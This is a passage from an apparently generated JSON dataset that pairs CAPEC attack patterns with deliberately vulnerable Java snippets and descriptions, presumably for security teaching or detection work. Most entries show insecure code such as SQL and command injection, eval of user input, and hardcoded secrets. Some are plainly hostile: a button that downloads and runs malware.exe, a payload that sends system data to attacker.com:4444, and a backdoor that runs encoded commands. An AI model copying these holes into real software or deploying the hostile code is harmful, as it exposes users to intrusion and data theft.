        "code_snippet": "public class WebApplication {\n    @RequestMapping(\"/api/user/details\")\n    public String getUserDetails(@RequestParam String userId) {\n        try {\n            String serverInfo = System.getProperty(\"java.version\") + \" \" + \n                               System.getProperty(\"os.name\") + \" \" + \n                               System.getProperty(\"os.version\");\n            \n            Connection conn = DriverManager.getConnection(\n                \"jdbc:mysql://localhost:3306/userdb?serverVersion=8.0\");\n            String query = \"SELECT * FROM users WHERE id = \" + userId;\n            ResultSet rs = conn.createStatement().executeQuery(query);\n            \n            if(!rs.next()) {\n                throw new Exception(\"User not found in database: \" + userId + \n                                  \". Database version: \" + conn.getMetaData().getDatabaseProductVersion());\n            }\n            \n            return \"Server Info: \" + serverInfo + \n                   \"\\nDatabase Info: \" + conn.getMetaData().getDatabaseProductName() + \n                   \"\\nUser Data: \" + rs.getString(\"username\");\n            \n        } catch(Exception e) {\n            return \"Error occurred: \" + e.getMessage() + \n                   \"\\nStack trace: \" + Arrays.toString(e.getStackTrace());\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues related to system fingerprinting. It exposes sensitive system information through error messages and normal responses, uses GET requests with sensitive parameters, reveals detailed stack traces and system versions, and lacks proper input validation. The code leaks information about Java version, OS details, database version, and internal system structure through both successful responses and error messages."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "public class DynamicVariableEvaluator {\n    public static String globalValue = \"sensitive_data\";\n\n    public Object evaluateUserInput(String userInput) {\n        try {\n            String expression = \"return \" + userInput + \";\";\n            ScriptEngineManager manager = new ScriptEngineManager();\n            ScriptEngine engine = manager.getEngineByName(\"js\");\n            engine.put(\"globalValue\", globalValue);\n            return engine.eval(expression);\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    public static void main(String[] args) {\n        DynamicVariableEvaluator evaluator = new DynamicVariableEvaluator();\n        String userControlledInput = \"globalValue\";\n        Object result = evaluator.evaluateUserInput(userControlledInput);\n    }\n}",
        "description": "This code demonstrates several vulnerabilities related to dynamic variable evaluation and control. It uses eval-like functionality through ScriptEngine to evaluate user-controlled input, allows access to global variables through dynamic evaluation, and doesn't properly validate or sanitize the input. An attacker could manipulate the userInput to access or modify sensitive variables or execute arbitrary JavaScript code."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "public class MaliciousClickHandler {\n    private JButton submitButton;\n    private JFrame frame;\n    \n    public void createUI() {\n        frame = new JFrame(\"Secure Query System\");\n        submitButton = new JButton(\"Submit Query\");\n        \n        submitButton.addActionListener(new ActionListener() {\n            public void actionPerformed(ActionEvent e) {\n                // Misrepresenting the actual action\n                try {\n                    URL url = new URL(\"http://malicious-site.com/malware.exe\");\n                    URLConnection conn = url.openConnection();\n                    InputStream in = conn.getInputStream();\n                    \n                    // Silently download and execute file instead of submitting query\n                    File file = new File(System.getProperty(\"user.home\") + \"/downloaded_update.exe\");\n                    FileOutputStream out = new FileOutputStream(file);\n                    byte[] buffer = new byte[1024];\n                    int len;\n                    while ((len = in.read(buffer)) > 0) {\n                        out.write(buffer, 0, len);\n                    }\n                    out.close();\n                    \n                    // Execute the downloaded file\n                    Runtime.getRuntime().exec(file.getAbsolutePath());\n                    \n                    // Show fake success message\n                    JOptionPane.showMessageDialog(frame, \"Query submitted successfully!\");\n                } catch (Exception ex) {\n                    ex.printStackTrace();\n                }\n            }\n        });\n    }\n}",
        "description": "This vulnerable code demonstrates UI misrepresentation by creating a button that claims to submit a query but actually downloads and executes malware. It exploits user trust by performing an unexpected and malicious action (downloading and executing a file) while displaying a misleading success message. The code lacks proper intent verification and implements incorrect destination specification in its communication channel."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "public class FlashUploader extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String flashVars = request.getParameter(\"flashVars\");\n        String uploadedFile = request.getParameter(\"uploadedFile\");\n        \n        // Vulnerable: No validation of flash parameters\n        String flashEmbed = \"<object type='application/x-shockwave-flash'>\"\n                         + \"<param name='movie' value='player.swf'>\"\n                         + \"<param name='FlashVars' value='\" + flashVars + \"'>\"\n                         + \"</object>\";\n        \n        // Vulnerable: No file type validation\n        String fileName = uploadedFile.substring(uploadedFile.lastIndexOf(\"/\") + 1);\n        File file = new File(\"/web/uploads/\" + fileName);\n        FileOutputStream fos = new FileOutputStream(file);\n        \n        // Vulnerable: Cross-domain policy allows all domains\n        String crossDomainXml = \"<?xml version='1.0'?>\"\n                              + \"<cross-domain-policy>\"\n                              + \"<allow-access-from domain='*' />\"\n                              + \"</cross-domain-policy>\";\n        \n        response.getWriter().write(flashEmbed);\n    }\n}",
        "description": "This vulnerable code demonstrates a Flash uploader that fails to properly validate Flash parameters, allows unrestricted file uploads, and implements an overly permissive cross-domain policy. The code directly injects user-supplied flashVars into HTML without sanitization, accepts any file type without validation, and creates a cross-domain policy that allows access from any domain."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "public class RemoteLibraryLoader {\n    public static void loadAndExecuteLibrary(String userProvidedURL) throws Exception {\n        URL url = new URL(userProvidedURL);\n        URLClassLoader loader = new URLClassLoader(new URL[]{url});\n        Class<?> loadedClass = loader.loadClass(\"com.example.RemoteCode\");\n        Method method = loadedClass.getMethod(\"execute\");\n        method.invoke(loadedClass.newInstance());\n    }\n    \n    public static void main(String[] args) {\n        try {\n            String remoteLibURL = System.getProperty(\"lib.location\");\n            loadAndExecuteLibrary(remoteLibURL);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates unsafe remote code inclusion by loading and executing a Java class from a URL specified through system properties. The code does not validate the source of the loaded class, allowing an attacker to supply a malicious library URL that could contain harmful code. The vulnerability stems from blindly trusting and executing code from an untrusted source."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "public class ConfigurationManager {\n    private static String configFilePath = \"system.config\";\n    private static int securityVersion = 1;\n\n    public static void updateSystemSettings(String newSettings) {\n        try {\n            FileWriter writer = new FileWriter(configFilePath);\n            writer.write(newSettings);\n            writer.close();\n            \n            // Downgrade security version without verification\n            if(newSettings.contains(\"version=\")) {\n                securityVersion = Integer.parseInt(newSettings.split(\"version=\")[1]);\n            }\n            \n            // Immediately apply new settings without validation\n            applySettings(newSettings);\n            \n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void applySettings(String settings) {\n        // Debug mode bypass of security checks\n        boolean debugMode = System.getProperty(\"debug\") != null;\n        if(debugMode) {\n            System.setProperty(\"security.lock\", \"disabled\");\n        }\n        \n        // Apply settings without integrity verification\n        System.setProperty(\"system.config\", settings);\n    }\n}",
        "description": "This vulnerable code demonstrates configuration manipulation vulnerabilities by allowing external control of system settings without proper validation, security version downgrade capability, and debug mode security bypass. It lacks proper lock bit protection and configuration state integrity verification, making it susceptible to unauthorized modifications of system settings."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "public class FileLoader {\n    private static final String CONFIG_DIR = \"/app/config/\";\n\n    public String loadConfiguration(String filename) {\n        File configFile = new File(CONFIG_DIR + filename);\n        try {\n            BufferedReader reader = new BufferedReader(new FileReader(configFile));\n            String content = reader.readLine();\n            reader.close();\n            return content;\n        } catch (IOException e) {\n            return null;\n        }\n    }\n\n    public void executeScript(String scriptName) {\n        String script = loadConfiguration(scriptName);\n        if (script != null) {\n            try {\n                Runtime.getRuntime().exec(script);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates unsafe file loading by directly concatenating a user-provided filename with a base directory path without proper validation. An attacker could use path traversal (e.g., '../') to access files outside the intended directory or create malicious files with matching names in directories that are searched first. The code also blindly executes the content of loaded files, which could lead to arbitrary code execution if an attacker can control the loaded file content."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "public class FlashPlayerController extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String swfUrl = request.getParameter(\"swf\");\n        String callback = request.getParameter(\"callback\");\n        \n        // Vulnerable: No validation of SWF URL or callback parameter\n        response.setHeader(\"Content-Type\", \"text/html\");\n        String output = \"<object type='application/x-shockwave-flash' data='\" + swfUrl + \"'>\";\n        output += \"<param name='allowScriptAccess' value='always' />\";\n        output += \"<param name='flashvars' value='callback=\" + callback + \"' />\";\n        output += \"</object>\";\n        \n        response.getWriter().write(output);\n    }\n}",
        "description": "This code demonstrates a vulnerable Flash player implementation that accepts untrusted SWF URLs and callback parameters without validation. It sets permissive Flash security settings (allowScriptAccess='always') and directly embeds user-controlled input into the HTML output. The code is vulnerable to XSS, open redirects, and malicious Flash content execution through unvalidated external URLs and callbacks."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "public class MicroserviceController {\n    @RequestMapping(value = \"/api/userdata\", method = RequestMethod.GET)\n    public ResponseEntity<UserData> getUserData(\n        @RequestParam String userId,\n        @RequestParam String accessToken,\n        HttpServletResponse response) {\n        \n        UserData userData = userService.getUserDetails(userId);\n        \n        // Store sensitive data in cookies\n        Cookie persistentCookie = new Cookie(\"user_token\", accessToken);\n        persistentCookie.setMaxAge(365 * 24 * 60 * 60); // 1 year\n        persistentCookie.setPath(\"/\");\n        response.addCookie(persistentCookie);\n        \n        // Store sensitive files under web root\n        String filePath = \"/var/www/html/user_files/\" + userId + \".json\";\n        FileWriter writer = new FileWriter(filePath);\n        writer.write(userData.toString());\n        writer.close();\n        \n        return ResponseEntity.ok(userData);\n    }\n}",
        "description": "This vulnerable code demonstrates several security issues: exposing sensitive data through GET parameters, storing sensitive information in persistent cookies, saving sensitive files under web root, and relying on client-side security. The microservice endpoint is easily discoverable and exposes user data through query parameters, making it susceptible to information gathering and exploitation."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "public class ResourceManager {\n    private static final String SENSITIVE_FILE_PATH = \"/etc/secure/config.dat\";\n    \n    static {\n        // Misconfigured file permissions set during initialization\n        File sensitiveFile = new File(SENSITIVE_FILE_PATH);\n        sensitiveFile.setWritable(true, false); // World-writable\n        sensitiveFile.setReadable(true, false); // World-readable\n    }\n    \n    public void accessResource(String username) {\n        // No proper access control checks before accessing resource\n        try {\n            FileInputStream fis = new FileInputStream(SENSITIVE_FILE_PATH);\n            // Process sensitive data without verification\n            processData(fis);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void processData(FileInputStream fis) {\n        // Processing happens after access is already granted\n        // No validation of user permissions\n    }\n}",
        "description": "This code demonstrates multiple access control vulnerabilities. It sets overly permissive file permissions during initialization, allowing any user to read and write to sensitive files. It lacks proper access control checks before accessing resources, and performs security checks after access has already been granted. The code also shows improper granularity in access control by applying broad permissions instead of specific user-based restrictions."
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "public class VulnerableFlashOverlay extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String flashContent = \"<object data='untrusted.swf' type='application/x-shockwave-flash'>\n            <param name='wmode' value='transparent'>\n            <param name='allowScriptAccess' value='always'>\n        </object>\";\n\n        String userContent = request.getParameter(\"content\");\n        \n        response.setContentType(\"text/html\");\n        response.getWriter().write(\"<html><body>\" +\n            \"<div style='position:absolute; z-index:1;'>\" + userContent + \"</div>\" +\n            \"<div style='position:absolute; z-index:2;'>\" + flashContent + \"</div>\" +\n            \"</body></html>\");\n    }\n}",
        "description": "This code creates a vulnerable web page that allows clickjacking through a transparent Flash overlay. It accepts untrusted Flash content and user input without proper validation, positions the Flash layer above legitimate content, and doesn't implement any frame-busting or X-Frame-Options protection. The code also directly embeds user input without sanitization, enabling XSS attacks."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "public class FlashContentLoader {\n    public void loadFlashContent(String flashURL) {\n        // No validation of flashURL input\n        String crossDomainPolicy = \"*\";  // Allows all domains\n        \n        try {\n            // Directly loads flash content from user-provided URL\n            Object flashObject = new Object() {\n                public void executeFlashContent() {\n                    // Loads and executes flash content without checking source\n                    loadFlash(flashURL, crossDomainPolicy);\n                }\n                \n                private void loadFlash(String url, String policy) {\n                    // Simulated flash loading - vulnerable implementation\n                    if(policy.equals(\"*\")) {\n                        // Loads content from any domain without verification\n                        System.out.println(\"Loading flash from: \" + url);\n                    }\n                }\n            };\n            \n            ((Object) flashObject).executeFlashContent();\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a flash content loader that fails to validate input URLs, uses permissive cross-domain policies, and doesn't implement proper input sanitization. It allows loading flash content from any domain without verification, making it susceptible to cross-site flashing attacks where an attacker can specify malicious flash content to be executed."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
        "code_snippet": "public class EmailService {\n    private static final String MAIL_SERVER = \"mail.example.com\";\n    \n    public void sendEmail(String recipient, String subject, String body) {\n        try {\n            String command = \"echo '\" + body + \"' | mail -s '\" + subject + \"' \" + recipient;\n            Runtime.getRuntime().exec(command);\n            \n            // Log the email details\n            System.out.println(\"Mail command executed: \" + command);\n        } catch (Exception e) {\n            // Expose sensitive information in error message\n            System.err.println(\"Error sending mail to \" + MAIL_SERVER + \": \" + e.toString());\n            e.printStackTrace();\n        }\n    }\n    \n    public void fetchEmails(String username, String password) {\n        try {\n            String imapCommand = \"curl 'imap://\" + username + \":\" + password + \"@\" + MAIL_SERVER + \"/INBOX'\";\n            Process process = Runtime.getRuntime().exec(imapCommand);\n            \n            // Trust client-provided credentials without server-side validation\n            if (process.waitFor() == 0) {\n                System.out.println(\"Successfully fetched emails for: \" + username);\n            }\n        } catch (Exception e) {\n            System.err.println(\"Failed to connect to IMAP server: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable email handling that's susceptible to command injection through unvalidated user input in email body, subject, and credentials. It directly concatenates user input into shell commands, exposes sensitive information in error messages, and lacks proper input sanitization and encoding. The code also incorrectly relies on client-side validation for credentials."
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "public class UnsafeUpdater {\n    private static final String UPDATE_SERVER = \"http://updates.example.com\";\n    \n    public void downloadAndExecuteUpdate() {\n        try {\n            URL url = new URL(UPDATE_SERVER + \"/update.jar\");\n            URLConnection conn = url.openConnection();\n            InputStream in = conn.getInputStream();\n            \n            File updateFile = new File(\"update.jar\");\n            FileOutputStream out = new FileOutputStream(updateFile);\n            \n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            out.close();\n            \n            // Execute downloaded JAR without verification\n            Runtime.getRuntime().exec(\"java -jar update.jar\");\n            \n            // Expose system information in log\n            System.out.println(\"System path: \" + System.getProperty(\"java.library.path\"));\n            System.out.println(\"User home: \" + System.getProperty(\"user.home\"));\n            System.out.println(\"OS version: \" + System.getProperty(\"os.version\"));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including downloading and executing code without integrity verification (CWE-494), potential for embedded malicious code execution (CWE-506), and exposure of sensitive system information (CWE-497). The code downloads a JAR file from a remote server without any signature or checksum verification, executes it with full privileges, and leaks system information through logging."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "public class UpdaterService {\n    private static final String UPDATE_URL = \"http://malicious-server.com/update.jar\";\n    \n    public void downloadAndExecuteUpdate() {\n        try {\n            URL url = new URL(UPDATE_URL);\n            URLConnection conn = url.openConnection();\n            InputStream is = conn.getInputStream();\n            File tempFile = File.createTempFile(\"update\", \".jar\");\n            \n            FileOutputStream fos = new FileOutputStream(tempFile);\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = is.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            is.close();\n            \n            // Execute downloaded JAR without verification\n            Runtime.getRuntime().exec(\"java -jar \" + tempFile.getPath());\n            \n            // Hidden malicious payload\n            new Thread(() -> {\n                try {\n                    String systemInfo = System.getProperty(\"os.name\") + \n                                       System.getProperty(\"user.name\") + \n                                       System.getProperty(\"user.home\");\n                    new Socket(\"attacker.com\", 4444).getOutputStream()\n                        .write(systemInfo.getBytes());\n                } catch(Exception e) {}\n            }).start();\n        } catch(Exception e) {}\n    }\n}",
        "description": "This vulnerable code downloads and executes a JAR file from an untrusted source without any integrity checks. It includes a hidden malicious payload that collects system information and sends it to an attacker's server. The code demonstrates multiple vulnerabilities including unverified code download, hidden malicious functionality, and unauthorized data exfiltration."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "public class UpdateManager {\n    public static void downloadAndInstallUpdate(String updateUrl) {\n        try {\n            URL url = new URL(updateUrl);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            \n            InputStream in = conn.getInputStream();\n            File updateFile = new File(\"system_update.jar\");\n            FileOutputStream out = new FileOutputStream(updateFile);\n            \n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            \n            // Execute the downloaded file without verification\n            Runtime.getRuntime().exec(\"java -jar system_update.jar\");\n            \n            in.close();\n            out.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an update system that downloads and executes code without verifying its integrity or authenticity. It blindly downloads a JAR file from a specified URL and executes it without any signature verification, checksums, or source validation, making it susceptible to malicious code injection through fake updates."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "public class AutoUpdater {\n    private static final String UPDATE_SERVER = \"http://update-server.com\";\n\n    public void checkAndInstallUpdate() {\n        try {\n            URL url = new URL(UPDATE_SERVER + \"/latest.jar\");\n            URLConnection conn = url.openConnection();\n            \n            // No server authentication check\n            InputStream in = conn.getInputStream();\n            byte[] updateBytes = in.readAllBytes();\n            \n            // No digital signature or checksum verification\n            File updateFile = new File(\"update.jar\");\n            FileOutputStream fos = new FileOutputStream(updateFile);\n            fos.write(updateBytes);\n            fos.close();\n            \n            // Directly load and execute downloaded code\n            URLClassLoader classLoader = new URLClassLoader(\n                new URL[]{updateFile.toURI().toURL()}\n            );\n            Class<?> updateClass = classLoader.loadClass(\"UpdateModule\");\n            updateClass.getDeclaredMethod(\"executeUpdate\").invoke(null);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code implements an auto-update mechanism that downloads and executes code without proper server authentication or integrity checks. It connects to an update server without verifying its authenticity, downloads a JAR file without validating its signature or checksums, and executes the downloaded code directly. This makes it susceptible to man-in-the-middle attacks where an attacker could serve malicious updates from a fake server."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "public class UnsecureDevice {\n    private static final String ENCRYPTION_KEY = \"hardcoded_key_123\";\n    private static final int[] SECURITY_BITS = {0x1A, 0x2B, 0x3C};\n    \n    @Deprecated\n    public String getDebugInfo() {\n        StringBuilder info = new StringBuilder();\n        info.append(\"CPU: \").append(System.getProperty(\"os.arch\"));\n        info.append(\"\\nOS: \").append(System.getProperty(\"os.version\"));\n        info.append(\"\\nJVM: \").append(System.getProperty(\"java.version\"));\n        info.append(\"\\nMemory: \").append(Runtime.getRuntime().totalMemory());\n        return info.toString();\n    }\n    \n    public byte[] encrypt(byte[] data) {\n        // Using weak encryption\n        for(int i = 0; i < data.length; i++) {\n            data[i] = (byte)(data[i] ^ SECURITY_BITS[i % SECURITY_BITS.length]);\n        }\n        return data;\n    }\n    \n    // Undocumented backdoor\n    private void enableTestMode() {\n        if(System.getProperty(\"test.mode\") != null) {\n            SECURITY_BITS[0] = 0x00;\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to reverse engineering protection. It includes hardcoded cryptographic keys, exposes sensitive system information through debug methods, implements weak XOR encryption, and contains an undocumented backdoor feature. The code lacks protection against hardware analysis and contains security-critical operations that could be optimized away by the compiler."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "public class SecureTokenValidator {\n    private static final String SECRET_TOKEN = \"s3cr3t123\";\n\n    public boolean validateToken(String userToken) {\n        boolean isValid = true;\n        for(int i = 0; i < SECRET_TOKEN.length(); i++) {\n            if(userToken.charAt(i) != SECRET_TOKEN.charAt(i)) {\n                isValid = false;\n                Thread.sleep(50); // Timing variation\n                break;\n            }\n            Thread.sleep(10); // Additional processing time\n        }\n        System.out.println(\"Validation result: \" + isValid);\n        return isValid;\n    }\n}",
        "description": "This code demonstrates a vulnerable token validation implementation that is susceptible to timing attacks and information leakage. The code exhibits multiple vulnerabilities: it leaks validation results through console output, contains timing variations that can be analyzed through side-channel attacks, and performs character-by-character comparison that creates observable timing differences based on how many characters match."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "public class SecretBackdoor {\n    private static final String HIDDEN_CMD = \"systemctl\";\n    private static String key = \"s3cr3t\";\n    \n    private void executeHiddenCommand(String input) {\n        if (input.contains(key)) {\n            try {\n                String decodedCmd = new String(Base64.getDecoder().decode(input.split(\":\")[1]));\n                Runtime.getRuntime().exec(HIDDEN_CMD + \" \" + decodedCmd);\n                sendDataToRemoteServer(\"localhost:8080/collector\", \n                    System.getProperty(\"user.name\") + \":\" + decodedCmd);\n            } catch (Exception e) {\n                // Silently fail to avoid detection\n            }\n        }\n    }\n    \n    private void sendDataToRemoteServer(String url, String data) {\n        try {\n            URL server = new URL(\"http://\" + url);\n            HttpURLConnection conn = (HttpURLConnection) server.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n            conn.getOutputStream().write(data.getBytes());\n        } catch (Exception e) {\n            // Suppress all errors\n        }\n    }\n}",
        "description": "This code implements a hidden backdoor functionality that accepts encoded commands and executes them with system privileges. It contains undocumented features, collects sensitive system information, and sends data to an unauthorized remote server. The code lacks integrity checks and represents embedded potentially malicious functionality that could be discovered through reverse engineering."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "public class DatabaseConnector {\n    private static final String DB_PASSWORD = \"s3cr3tP@ssw0rd\";\n    private static final String ENCRYPTION_KEY = \"ABC123XYZ789\";\n    private static final String API_KEY = \"sk_live_12345abcdef\";\n    \n    public boolean connect() {\n        String connectionString = \"jdbc:mysql://db.example.com/mydb\";\n        String username = \"admin\";\n        return establishConnection(connectionString, username, DB_PASSWORD);\n    }\n    \n    public String encryptData(String data) {\n        return performEncryption(data, ENCRYPTION_KEY);\n    }\n    \n    public void makeApiCall() {\n        HttpClient client = HttpClient.newHttpClient();\n        HttpRequest request = HttpRequest.newBuilder()\n            .header(\"Authorization\", \"Bearer \" + API_KEY)\n            .build();\n        // Make API call\n    }\n}",
        "description": "This code demonstrates hardcoded sensitive information including database credentials, encryption keys, and API keys directly in the source code as string literals. These values are stored as class constants but remain easily discoverable through decompilation or binary analysis. The sensitive information is stored in cleartext within the executable, making it vulnerable to extraction through reverse engineering."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "public class NetworkProtocolManager {\n    private static final String WEAK_CIPHER = \"DES\";\n    \n    public void establishConnection(Socket socket) throws Exception {\n        String secretKey = \"myweakkey123\";\n        Cipher cipher = Cipher.getInstance(WEAK_CIPHER);\n        \n        // Insecure protocol negotiation\n        String protocol = negotiateProtocol(socket);\n        \n        // Transmit sensitive data in cleartext\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        out.println(\"USERNAME=admin;PASSWORD=secret123\");\n        \n        // Weak encryption for data transmission\n        SecretKeySpec key = new SecretKeySpec(secretKey.getBytes(), WEAK_CIPHER);\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n        \n        // Incorrect assumption about protocol data layout\n        byte[] rawData = new byte[1024];\n        System.arraycopy(getProtocolHeader(), 0, rawData, 0, 64);\n        \n        // Insecure conversion of security identifiers\n        int securityId = ByteBuffer.wrap(rawData, 0, 4).getInt();\n        grantAccess(securityId);\n    }\n    \n    private String negotiateProtocol(Socket socket) {\n        return \"SSL_V2\"; // Deliberately choosing older, less secure protocol\n    }\n    \n    private byte[] getProtocolHeader() {\n        return new byte[64];\n    }\n    \n    private void grantAccess(int securityId) {\n        // Direct use of raw security ID without proper validation\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities in protocol handling and data transmission. It uses weak encryption (DES), transmits sensitive credentials in cleartext, allows protocol downgrade to less secure versions, makes assumptions about memory layout with fixed buffer sizes, and implements insecure conversion of security identifiers. The code fails to properly protect sensitive data and is susceptible to protocol analysis attacks."
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "public class FileIncluder extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = request.getParameter(\"file\");\n        String basePath = \"/usr/local/webapps/includes/\";\n        \n        try {\n            File file = new File(basePath + filePath);\n            if(filePath.endsWith(\".php\")) {\n                Process process = Runtime.getRuntime().exec(\"php \" + file.getAbsolutePath());\n                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n                String line;\n                while((line = reader.readLine()) != null) {\n                    response.getWriter().println(line);\n                }\n            }\n        } catch(Exception e) {\n            response.getWriter().println(\"Error including file: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This vulnerable code accepts a file parameter from a request without proper validation and attempts to include and execute it as a PHP file. It allows for remote file inclusion by not validating the file path, potentially allowing attackers to include malicious files from remote locations. The code also exposes sensitive error messages and doesn't properly sanitize file paths, making it susceptible to directory traversal attacks."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "public class EmailAuthenticator {\n    public static boolean verifyEmailSender(String emailFrom) {\n        // Weak authentication - only checks if email format is valid\n        return emailFrom.matches(\"^[A-Za-z0-9+_.-]+@(.+)$\");\n    }\n    \n    public class EmailMessage {\n        private String from;\n        private String content;\n        \n        public EmailMessage(String from, String content) {\n            // No verification of actual sender identity\n            this.from = from;\n            this.content = content;\n        }\n        \n        public void sendMessage() {\n            if(verifyEmailSender(from)) {\n                // Directly process message without proper authentication\n                processMessage(from, content);\n            }\n        }\n        \n        private void processMessage(String sender, String content) {\n            // Process message with assumed trust in sender identity\n            System.out.println(\"Processing message from: \" + sender);\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable email authentication by only performing basic format validation of the sender's email address without proper sender verification. It allows message spoofing by accepting any well-formatted email address as the sender, without validating the actual identity or origin of the sender. The code lacks proper channel authentication, message integrity checks, and endpoint verification, making it susceptible to identity spoofing and unauthorized message manipulation."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "public class EmailAuthentication {\n    private static final String TRUSTED_DOMAIN = \"company.com\";\n\n    public static boolean authenticateUser(String emailFrom, String message) {\n        // Vulnerable: Only checks if email ends with trusted domain\n        // No actual verification of sender identity\n        if (emailFrom.endsWith(TRUSTED_DOMAIN)) {\n            // Blindly trust messages from company domain\n            processSecureMessage(message);\n            return true;\n        }\n        return false;\n    }\n\n    public static void processSecureMessage(String message) {\n        // Process message assuming it's from trusted source\n        System.out.println(\"Processing secure message: \" + message);\n    }\n\n    public static void main(String[] args) {\n        // Attacker can easily spoof email address\n        String spoofedEmail = \"ceo@company.com\";\n        String maliciousMessage = \"Transfer $10000 to account XX-YY-ZZ\";\n        authenticateUser(spoofedEmail, maliciousMessage);\n    }\n}",
        "description": "This code demonstrates a vulnerable email authentication system that can be exploited through principal spoofing. The authentication mechanism only checks if the email address ends with a trusted domain, without verifying the actual identity of the sender. An attacker can easily spoof the email address to impersonate a trusted user and send malicious messages that will be processed as legitimate. The code exhibits CWE-290 (Authentication Bypass by Spoofing) and CWE-1390 (Weak Authentication) by implementing an insufficient authentication mechanism that relies solely on unverified sender information."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "public class SessionManager {\n    private static final String STATIC_SECRET = \"hardcoded_secret_key\";\n    private Map<String, String> sessions = new HashMap<>();\n    \n    public String createSession(String username) {\n        String sessionId = username + \"_\" + System.currentTimeMillis();\n        String token = Base64.getEncoder().encodeToString(sessionId.getBytes());\n        sessions.put(sessionId, username);\n        return token;\n    }\n    \n    public boolean validateSession(String token) {\n        String sessionId = new String(Base64.getDecoder().decode(token));\n        return sessions.containsKey(sessionId);\n    }\n    \n    public void login(String username, String password) {\n        // Send credentials in plain text\n        HttpURLConnection conn = (HttpURLConnection) new URL(\"http://example.com/login\").openConnection();\n        String credentials = username + \":\" + password;\n        conn.setRequestProperty(\"Authorization\", credentials);\n    }\n}",
        "description": "This vulnerable code demonstrates multiple session management issues: using a predictable session ID format, hardcoded secret key, no session expiration, plain text credential transmission, and lack of session invalidation. The session tokens are easily forgeable as they're based on a simple concatenation of username and timestamp with base64 encoding. The code transmits credentials without encryption and maintains sessions indefinitely without proper cleanup."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
